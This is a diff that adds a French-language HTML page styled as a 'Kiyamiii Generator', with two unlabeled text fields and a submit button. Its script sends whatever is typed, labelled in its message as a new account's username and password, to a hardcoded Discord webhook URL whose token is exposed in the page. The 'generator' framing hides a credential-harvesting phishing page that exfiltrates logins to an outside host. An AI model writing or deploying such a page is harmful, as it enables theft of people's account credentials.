@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>Kiyamiii</title>
+
+<style>
+body{
+    margin:0;
+    font-family:Arial;
+    background: radial-gradient(circle at top,#2a0040,#0b0014);
+    color:white;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+.container{
+    background:#120020;
+    padding:40px;
+    border-radius:12px;
+    width:360px;
+    text-align:center;
+    box-shadow:0 0 25px rgba(140,0,255,0.4);
+}
+
+h1{
+    color:#c58cff;
+    font-size:32px;
+}
+
+input{
+    width:100%;
+    padding:12px;
+    margin-top:12px;
+    border-radius:8px;
+    border:none;
+    background:#1e0033;
+    color:white;
+}
+
+button{
+    width:100%;
+    padding:12px;
+    margin-top:20px;
+    border:none;
+    border-radius:8px;
+    background:linear-gradient(90deg,#7b00ff,#b266ff);
+    color:white;
+    font-weight:bold;
+    cursor:pointer;
+}
+
+button:hover{
+    opacity:0.9;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+<h1>Kiyamiii Generator</h1>
+
+<form id="form">
+<input id="input1" type="text" placeholder="1" required>
+<input id="input2" type="text" placeholder="2" required>
+
+<button type="submit">Envoyer</button>
+</form>
+
+</div>
+
+<script>
+const webhookURL = "https://discord.com/api/webhooks/1474893264816705659/gU99T-JxxvkIsPJ3PdtAWCBJ-TuYSTtXqzvGqBbfUpEYrmCAmkEoYcbDGDOmXSzXXnPS";
+
+document.getElementById("form").addEventListener("submit", function(e){
+    e.preventDefault();
+
+    const value1 = document.getElementById("input1").value;
+    const value2 = document.getElementById("input2").value;
+
+    const data = {
+        content: "👌 **Nouveau compte**\n\npseudo : " + value1 + "\npassword : " + value2
+    };
+
+    fetch(webhookURL, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+    }).then(() => {
+        alert("Envoyé !");
+        document.getElementById("form").reset();
+    });
+});
+</script>
+
+</body>
+</html>
